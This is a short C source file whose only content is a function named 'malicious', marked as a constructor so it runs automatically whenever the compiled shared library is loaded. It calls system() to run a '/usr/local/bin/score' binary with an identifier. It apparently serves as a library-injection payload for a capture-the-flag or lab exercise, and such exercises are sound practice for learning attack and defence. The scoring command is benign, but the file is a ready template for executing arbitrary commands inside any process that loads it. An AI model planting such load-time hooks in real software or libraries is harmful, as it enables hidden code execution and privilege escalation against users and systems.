#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 2ed448d8-d5f5-42e4-ab57-a801b603f750");
}
